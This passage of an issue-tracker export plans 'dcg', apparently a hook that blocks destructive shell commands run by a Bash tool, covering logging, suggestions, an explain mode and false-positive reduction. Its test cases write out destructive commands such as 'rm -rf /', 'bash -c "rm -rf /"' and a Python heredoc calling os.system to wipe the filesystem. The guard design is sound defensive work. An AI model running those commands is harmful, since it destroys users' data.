modes.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:05:08.791980925-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:05:08.791980925-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.3","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:05:08.793291122-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:06:02.265838837-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.4","title":"Structured logging for allow/deny decisions (optional redaction)","description":"## Objective\n\nImprove operational visibility without compromising privacy by offering structured logs for decisions.\n\n## Background\n\n`dcg` already supports a simple log file for blocked commands. As we add more sophisticated analysis (execution context, heredocs, AST), we need logs that can support:\n\n- diagnosing false positives\n- tuning config\n- measuring performance impact\n\n## Proposed logging fields\n\nAt minimum (on deny/warn/log-only events):\n\n- timestamp\n- mode (deny/warn/log-only)\n- raw command (optionally redacted)\n- normalized command\n- pack_id\n- pattern_name\n- reason\n- execution context summary (if available)\n- elapsed time (optional)\n\n## Redaction strategy\n\n- Provide a config option to redact arguments beyond a threshold or redact quoted strings.\n- Default behavior should be conservative (log only for deny events).\n\n## Acceptance criteria\n\n- Logs are well-formed and append-only.\n- A `--json` log format exists (optional).\n- Unit tests verify logging output format.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:05:23.438761061-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:05:23.438761061-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:05:23.440080967-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:06:07.298637722-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-tlog","type":"relates-to","created_at":"2026-01-07T20:11:15.440752673-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5","title":"Suggestions DB: safe alternatives + how-to-allow guidance","description":"## Objective\n\nMake `dcg` helpful, not just restrictive, by attaching curated suggestions to blocked rules.\n\nWhen a command is blocked (or warned), the user should immediately see:\n\n- what happened (stable rule id)\n- why it's risky\n- safe alternatives / preview steps\n- how to allow safely (rule-id allowlist command)\n\n## Key idea\n\nMaintain a small, explicit \"suggestions database\" keyed by stable rule id:\n\n- `rule_id = \"pack_id:pattern_name\"`\n\nEach rule can have 0..N suggestions:\n\n- `preview_first` (e.g., `git clean -n`, `docker system df`)\n- `safer_alternative` (e.g., `--force-with-lease`)\n- `workflow_fix` (e.g., `git stash` first)\n- `allow_safely` (copy/paste allowlist command)\n- `docs` (README anchor)\n\n## Why this is worth doing\n\n- Reduces \"rage disable\" moments.\n- Teaches users safer habits.\n- Makes false positives much cheaper to resolve.\n\n## Constraints\n\n- Suggestions must be non-prescriptive when environment-specific.\n- Suggestions must be safe-by-default (no destructive commands suggested).\n- Hook output must remain bounded in size.\n\n## Acceptance criteria\n\n- For core rules, deny output includes at least one actionable suggestion.\n- Explain mode includes suggestions in all formats.\n- Suggestions are deterministic and test-covered.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T21:06:08.978286566-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:08.978286566-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T21:06:18.675450948-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.1","title":"Suggestions: data model + registry keyed by rule id","description":"## Objective\n\nDefine the suggestion data model and implement a registry lookup by stable rule id.\n\n## Background\n\nWhen DCG blocks a command, users need actionable guidance:\n- What safer alternatives exist?\n- How can they preview the effect first?\n- How can they allowlist if intentional?\n\nA well-designed suggestion system improves UX and reduces frustration.\n\n## SuggestionKind Enum\n\n```rust\n/// Type of suggestion to help the user\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\n#[serde(rename_all = \"snake_case\")]\npub enum SuggestionKind {\n    /// \"Run this first to preview the effect\"\n    /// e.g., \"Run `git diff` before `git reset --hard`\"\n    PreviewFirst,\n\n    /// \"Use this safer alternative instead\"\n    /// e.g., \"Use `git reset --soft` or `--mixed` instead of `--hard`\"\n    SaferAlternative,\n\n    /// \"Fix your workflow to avoid this situation\"\n    /// e.g., \"Commit your changes before resetting\"\n    WorkflowFix,\n\n    /// \"Read the documentation for more context\"\n    /// e.g., \"See: https://git-scm.com/docs/git-reset\"\n    Documentation,\n\n    /// \"How to allowlist this specific rule\"\n    /// e.g., \"To allow: `dcg allow core.git:reset-hard --reason '...'`\"\n    AllowSafely,\n}\n```\n\n## Suggestion Struct\n\n```rust\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Suggestion {\n    /// Type of suggestion\n    pub kind: SuggestionKind,\n\n    /// Human-readable suggestion text\n    pub text: String,\n\n    /// Optional command the user can copy/paste\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub command: Option\u003cString\u003e,\n\n    /// Optional URL for documentation\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub url: Option\u003cString\u003e,\n}\n```\n\n## Registry Implementation\n\n```rust\nuse std::sync::LazyLock;\nuse std::collections::HashMap;\n\n/// Registry of suggestions keyed by rule_id (e.g., \"core.git:reset-hard\")\nstatic SUGGESTION_REGISTRY: LazyLock\u003cHashMap\u003c\u0026'static str, Vec\u003cSuggestion\u003e\u003e\u003e =\n    LazyLock::new(|| {\n        let mut m = HashMap::new();\n\n        m.insert(\"core.git:reset-hard\", vec![\n            Suggestion {\n                kind: SuggestionKind::PreviewFirst,\n                text: \"Run `git diff` and `git status` to see what would be lost\".into(),\n                command: Some(\"git diff \u0026\u0026 git status\".into()),\n                url: None,\n            },\n            Suggestion {\n                kind: SuggestionKind::SaferAlternative,\n                text: \"Use `git reset --soft` or `--mixed` to preserve changes\".into(),\n                command: Some(\"git reset --soft HEAD~1\".into()),\n                url: None,\n            },\n            Suggestion {\n                kind: SuggestionKind::WorkflowFix,\n                text: \"Consider using `git stash` to save changes temporarily\".into(),\n                command: Some(\"git stash\".into()),\n                url: None,\n            },\n        ]);\n\n        // ... more rules\n        m\n    });\n\n/// Look up suggestions for a rule\npub fn get_suggestions(rule_id: \u0026str) -\u003e Option\u003c\u0026'static [Suggestion]\u003e {\n    SUGGESTION_REGISTRY.get(rule_id).map(|v| v.as_slice())\n}\n```\n\n## Output Formatting\n\n### Hook Deny Output (stderr)\nShow only top 1-3 suggestions to keep output bounded:\n\n```\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•‘  âš ï¸  BLOCKED: git reset --hard HEAD~5                        â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  Rule: core.git:reset-hard                                   â•‘\nâ•‘  Reason: Hard reset can permanently lose uncommitted changes â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  ğŸ’¡ Try instead:                                             â•‘\nâ•‘  â€¢ Run `git diff` first to see what would be lost            â•‘\nâ•‘  â€¢ Use `git reset --soft` to preserve changes                â•‘\nâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```\n\n### Explain Mode (JSON)\nInclude all suggestions in structured format:\n\n```json\n{\n  \"decision\": \"deny\",\n  \"rule_id\": \"core.git:reset-hard\",\n  \"reason\": \"Hard reset can permanently lose uncommitted changes\",\n  \"suggestions\": [\n    {\n      \"kind\": \"preview_first\",\n      \"text\": \"Run `git diff` and `git status` to see what would be lost\",\n      \"command\": \"git diff \u0026\u0026 git status\"\n    },\n    {\n      \"kind\": \"safer_alternative\",\n      \"text\": \"Use `git reset --soft` or `--mixed` to preserve changes\",\n      \"command\": \"git reset --soft HEAD~1\"\n    }\n  ]\n}\n```\n\n## Requirements\n\n- Registry lookup is O(1) via HashMap\n- Zero allocations on lookup (return static references)\n- Suggestions are stable and deterministic (iteration order preserved)\n- JSON output uses snake_case for kind values\n\n## Acceptance Criteria\n\n- Registry lookup is fast and allocation-light.\n- JSON output for explain includes suggestions in a stable order.\n- All SuggestionKind variants are used appropriately across rules.\n\n## Tests\n\n- Unit tests for registry lookup and ordering.\n- Snapshot tests for JSON output format.\n- Coverage test: assert all core pack rules have at least one suggestion.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:31.606222639-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:22:28.669910234-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.1","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:01.11809851-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:22:31.439334729-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.2","title":"Suggestions: populate core.git + core.filesystem","description":"## Objective\n\nPopulate suggestions for the highest-traffic and highest-impact rules:\n\n- `core.git:*`\n- `core.filesystem:*`\n\n## What to include\n\nFor each rule:\n\n- a short \"preview first\" command when applicable\n- a safer alternative when one exists\n- the recommended allowlist command (rule-id based)\n\nExamples (conceptual):\n\n- `core.git:reset-hard`:\n  - suggest `git stash` / `git diff` / `git reset --soft|--mixed`\n- `core.git:push-force-*`:\n  - suggest `--force-with-lease`\n- `core.filesystem:rm-rf-*`:\n  - suggest verifying path and using safer deletion flows when possible\n\n## Acceptance criteria\n\n- Every core rule has at least one suggestion.\n- Suggestions are accurate and generic (no environment assumptions).\n\n## Tests\n\n- A \"coverage\" test that asserts all core destructive patterns have at least 1 suggestion.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:36.697958943-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:36.697958943-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.2","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:06.209112022-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.2","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:22:36.533341338-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.3","title":"Suggestions: populate high-signal non-core packs (docker/k8s/db)","description":"## Objective\n\nPopulate suggestions for the packs most likely to appear in real dev workflows:\n\n- Docker\n- kubectl\n- databases (psql/mysql/redis)\n\n## Guidance\n\nPrefer \"preview\" suggestions:\n\n- docker: `docker system df` before `docker system prune`\n- kubectl: `--dry-run=client` / `kubectl diff`\n- SQL: backup / transaction guidance (keep generic)\n\n## Acceptance criteria\n\n- High-signal destructive patterns in these packs have suggestions.\n- Suggestions are concise and safe.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:41.789029161-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:41.789029161-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.3","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:11.302023318-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.3","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:22:41.631324095-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.4","title":"Integrate suggestions into deny output and explain mode","description":"## Objective\n\nMake suggestions visible where they matter:\n\n- hook deny output (stderr) includes the top suggestion(s)\n- `dcg explain` includes all suggestions (pretty/json/compact)\n\n## Requirements\n\n- Hook output must remain bounded; show only top 1-3 suggestions.\n- Explain output can show more, but must remain readable.\n\n## Acceptance criteria\n\n- Deny output shows stable rule id + at least one suggestion.\n- Explain mode shows suggestions in all formats.\n\n## Tests\n\n- Snapshot tests for deny output (stderr) for a few core rules.\n- Explain output tests include suggestions list.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:46.881705224-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:46.881705224-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:16.392198141-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:22:46.724344957-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.1.2","type":"blocks","created_at":"2026-01-07T21:22:51.819635023-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.1.3","type":"blocks","created_at":"2026-01-07T21:22:56.914257712-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.2.3","type":"blocks","created_at":"2026-01-07T21:23:02.00798218-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.5","title":"Suggestions: correctness and coverage tests","description":"## Objective\n\nPrevent suggestion drift and ensure suggestions remain helpful.\n\n## Tests\n\n- Coverage:\n  - assert that all patterns with `pattern_name` in core packs have at least one suggestion\n- Correctness (spot checks):\n  - ensure suggestions never include explicitly forbidden destructive commands (e.g., do not suggest `rm -rf`)\n- Ordering:\n  - stable output ordering across runs\n\n## Acceptance criteria\n\n- Suggestions are maintained as a first-class UX surface and do not regress silently.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:51.975279869-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:51.975279869-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.5","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:21.481797439-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.5","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:23:07.101892778-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.5","depends_on_id":"git_safety_guard-1gt.5.2","type":"blocks","created_at":"2026-01-07T21:23:12.196115784-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.6","title":"Implement dcg explain CLI subcommand","description":"## Objective\n\nImplement the `dcg explain \u003ccommand\u003e` CLI subcommand that provides a full decision trace for any command.\n\n## Background\n\nWhen DCG blocks (or allows) a command, users and developers need to understand WHY:\n- Which patterns matched?\n- Which packs were evaluated?\n- Was it blocked by a destructive pattern or allowed by a safe pattern?\n- What context classification was applied?\n\nThe explain mode provides complete transparency into DCG's decision-making process.\n\n## CLI Interface\n\n```bash\n# Basic usage\ndcg explain \"git reset --hard HEAD~5\"\n\n# Output format options\ndcg explain \"command\" --format pretty   # Human-readable (default)\ndcg explain \"command\" --format json     # Machine-readable\ndcg explain \"command\" --format compact  # Single-line summary\n\n# Verbose mode (include all evaluated packs, not just matching)\ndcg explain \"command\" --verbose\n```\n\n## Decision Trace Structure\n\nThe explain output should show the complete decision pipeline:\n\n```\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•‘  DCG Decision Trace                                              â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  Input: git reset --hard HEAD~5                                  â•‘\nâ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\nâ•‘  1. Parse                                                        â•‘\nâ•‘     â””â”€ Tool: Bash                                                â•‘\nâ•‘     â””â”€ Command: git reset --hard HEAD~5                          â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  2. Quick Reject                                                 â•‘\nâ•‘     â””â”€ Keywords found: git                                       â•‘\nâ•‘     â””â”€ Result: CONTINUE (keywords present)                       â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  3. Normalization                                                â•‘\nâ•‘     â””â”€ Original: git reset --hard HEAD~5                         â•‘\nâ•‘     â””â”€ Normalized: git reset --hard HEAD~5                       â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  4. Context Classification                                       â•‘\nâ•‘     â””â”€ Span[0..25]: Executed                                     â•‘\nâ•‘     â””â”€ No safe-string-arg context detected                       â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  5. Heredoc Detection                                            â•‘\nâ•‘     â””â”€ Tier 1 trigger: NO                                        â•‘\nâ•‘     â””â”€ Result: SKIP heredoc analysis                             â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  6. Pack Evaluation                                              â•‘\nâ•‘     â””â”€ Enabled packs: core.git, core.filesystem                  â•‘\nâ•‘     â””â”€ Pack: core.git                                            â•‘\nâ•‘        â”œâ”€ Safe pattern check: NO MATCH                           â•‘\nâ•‘        â””â”€ Destructive pattern check:                             â•‘\nâ•‘           â””â”€ MATCH: reset-hard                                   â•‘\nâ•‘              Pattern: git reset --hard                           â•‘\nâ•‘              Reason: Hard reset can permanently lose commits     â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  7. Decision                                                     â•‘\nâ•‘     â””â”€ Result: DENY                                              â•‘\nâ•‘     â””â”€ Rule ID: core.git:reset-hard                              â•‘\nâ•‘     â””â”€ Reason: Hard reset can permanently lose commits           â•‘\nâ• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\nâ•‘  8. Suggestions                                                  â•‘\nâ•‘     â””â”€ Run `git diff` first to see what would be lost            â•‘\nâ•‘     â””â”€ Use `git reset --soft` to preserve changes                â•‘\nâ•‘     â””â”€ To allow: dcg allow core.git:reset-hard --reason \"...\"    â•‘\nâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n```\n\n## JSON Output Format\n\n```json\n{\n  \"input\": {\n    \"raw\": \"git reset --hard HEAD~5\",\n    \"tool\": \"Bash\"\n  },\n  \"trace\": {\n    \"quick_reject\": {\n      \"keywords_found\": [\"git\"],\n      \"result\": \"continue\"\n    },\n    \"normalization\": {\n      \"original\": \"git reset --hard HEAD~5\",\n      \"normalized\": \"git reset --hard HEAD~5\"\n    },\n    \"context_classification\": {\n      \"spans\": [\n        {\"range\": [0, 25], \"kind\": \"executed\"}\n      ]\n    },\n    \"heredoc_detection\": {\n      \"tier1_triggered\": false\n    },\n    \"pack_evaluation\": {\n      \"enabled_packs\": [\"core.git\", \"core.filesystem\"],\n      \"matches\": [\n        {\n          \"pack_id\": \"core.git\",\n          \"pattern_name\": \"reset-hard\",\n          \"pattern\": \"git reset --hard\",\n          \"reason\": \"Hard reset can permanently lose commits\"\n        }\n      ]\n    }\n  },\n  \"decision\": \"deny\",\n  \"rule_id\": \"core.git:reset-hard\",\n  \"reason\": \"Hard reset can permanently lose commits\",\n  \"suggestions\": [\n    {\n      \"kind\": \"preview_first\",\n      \"text\": \"Run `git diff` first to see what would be lost\"\n    }\n  ]\n}\n```\n\n## Compact Output Format\n\n```\nDENY core.git:reset-hard \"git reset --hard HEAD~5\" -\u003e Hard reset can permanently lose commits\n```\n\n## Implementation Notes\n\n- Reuse the shared evaluator from 99e.3.1\n- Add tracing/instrumentation hooks to capture each step\n- Store trace in a `DecisionTrace` struct as evaluation proceeds\n- Format the trace based on `--format` flag\n\n## Performance\n\nExplain mode is NOT on the hot path (user explicitly requests it), so:\n- Can be slower than normal evaluation\n- Can allocate for trace storage\n- Should still complete in \u003c100ms for typical commands\n\n## Acceptance Criteria\n\n- `dcg explain` works for all command types (simple, heredoc, pipes)\n- Pretty format is human-readable and helps users understand decisions\n- JSON format is valid and parseable by external tools\n- Compact format is suitable for logging/scripting\n- Suggestions are included in the output","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T21:23:51.003342694-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:23:51.003342694-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.6","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T21:23:51.004688188-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-26f","title":"Define TypeScript destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous TypeScript constructs within heredoc bodies.\n\n## Why This Matters\n\nTypeScript heredocs (ts-node, tsx, npx ts-node) share JavaScript's risks plus:\n1. Type erasure can hide dangerous operations behind clean interfaces\n2. Decorators and metaprogramming can obscure behavior\n3. Many TypeScript users assume type safety means runtime safety (it doesn't)\n\n## Pattern Categories to Define\n\n### All JavaScript Patterns (Inherited)\nAll patterns from the JavaScript task apply here since TypeScript compiles to JavaScript.\n\n### TypeScript-Specific Patterns\n- any type casts that hide dangerous operations\n- Type assertions (as unknown as DangerousType)\n- @ts-ignore comments preceding dangerous code\n- Non-null assertions (!) on potentially null file handles\n\n### Decorator Abuse\n- Decorators that execute arbitrary code\n- Metadata reflection for dynamic execution\n- Class decorator patterns that modify behavior\n\n### Module System\n- Triple-slash directives loading external code\n- Type-only imports that get erased (import type)\n- Namespace merging that hides implementations\n\n## Implementation Notes\n\nTypeScript parsing requires tree-sitter-typescript which handles:\n- Generic type syntax\n- Type annotations\n- Decorators\n- JSX/TSX syntax variants\n\nConsider whether to parse TypeScript directly or check the JavaScript output.\n\n## Test Cases\n\nTest TypeScript-specific constructs:\n- Type assertions around dangerous calls\n- Decorator execution order\n- Generic type inference edge cases\n- Module augmentation\n\n## Dependencies\n\n- JavaScript patterns (shared base)\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:17.541114003-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.449207203-05:00","dependencies":[{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:34.25492655-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:34.273731104-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:37:34.292923988-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2cu","title":"Design false positive reduction strategy for string arguments","description":"## Objective\n\nDesign and implement strategies to dramatically reduce false positives in command blocking, especially for documentation and string arguments.\n\n## The Core Problem\n\nThe current regex-based guard suffers from context blindness. It sees:\n```\nbd create --description=\"Pattern blocks rm -rf commands\"\n```\n\nAnd matches \"rm -rf\" without understanding it's:\n1. Inside a quoted string\n2. An argument to a documentation tool\n3. NOT actually being executed\n\nThis creates severe workflow disruption when trying to document the very patterns we're blocking.\n\n## Why This Is Critical\n\nFalse positives are arguably WORSE than false negatives:\n- False negative: A dangerous command might slip through (rare, recoverable with backups)\n- False positive: Blocks legitimate work, forces workarounds, erodes trust in the tool\n- Repeated false positives lead users to disable the guard entirely\n\nThe guard must be TRUSTED to make intelligent decisions, not blindly pattern-match text.\n\n## Solution Approaches\n\n### 1. Command Structure Analysis (Primary Approach)\n\nParse the top-level command with tree-sitter-bash to understand structure:\n- Identify command name (bd, git, echo, etc.)\n- Identify argument positions (which are options vs values)\n- Identify quoting context (single, double, unquoted)\n- Only apply destructive patterns to EXECUTABLE positions\n\nExample analysis:\n```\nbd create --title=\"...\" --description=\"rm -rf pattern docs\"\n         ^command       ^option         ^string value (NOT executed)\n```\n\n### 2. Safe Command Registry\n\nMaintain a list of commands that take non-executable string arguments:\n- bd create, bd update (--description, --title)\n- git commit (-m), git tag (-m)\n- echo, printf (arguments are printed, not executed)\n- grep, rg (pattern arguments)\n\nFor these commands, don't apply destructive patterns to their string arguments.\n\n### 3. Execution Context Detection\n\nDistinguish between:\n- **Direct execution**: The string IS the command (`bash dangerous_cmd`)\n- **String literal**: The string is DATA passed to a command (`bd --desc=\"...\"`)\n- **Heredoc body**: Requires language-specific analysis (the whole point of ast-grep)\n\n### 4. Two-Phase Analysis\n\n1. **Quick structural check**: Parse command structure, identify context\n2. **Pattern matching**: Only apply patterns to executable contexts\n3. **Deep analysis**: For heredocs/complex cases, use ast-grep\n\n### 5. Confidence Scoring\n\nInstead of binary block/allow:\n- High confidence dangerous: Block immediately\n- Medium confidence: More thorough analysis\n- Low confidence (looks like documentation): Allow with optional warning\n\n## Implementation Strategy\n\n1. Add tree-sitter-bash as a dependency (if not using ast-grep CLI)\n2. Parse incoming commands to identify structure\n3. Create ExecutionContext enum: Direct, StringArg, Heredoc, PipeTarget\n4. Only apply destructive patterns when context is Direct, Heredoc, or PipeTarget\n5. For StringArg context with safe parent commands, skip pattern matching\n\n## Test Cases\n\nEssential false positive tests:\n- `bd create --description=\"This blocks rm -rf\"` â†’ ALLOW\n- `git commit -m \"Fix rm -rf pattern matching\"` â†’ ALLOW\n- `echo \"example: git reset --hard\"` â†’ ALLOW\n- `grep \"rm -rf\" patterns.txt` â†’ ALLOW\n\nEssential true positive tests (should still block):\n- `rm -rf /tmp/*` â†’ BLOCK\n- `bash -c \"rm -rf /\"` â†’ BLOCK\n- `python3 \u003c\u003c 'EOF'\n  import os; os.system(\"rm -rf /\")\n  EOF` â†’ BLOCK (via heredoc analysis)\n\n## Success Criteria\n\n- Zero false positives for documentation workflows (bd, git commit -m)\n- Zero false positives for string pattern searches (grep, rg)\n- Maintain blocking of actual dangerous commands\n- Sub-5ms overhead for structural analysis\n\n## Dependencies\n\n- Heredoc detection strategy (shares parsing 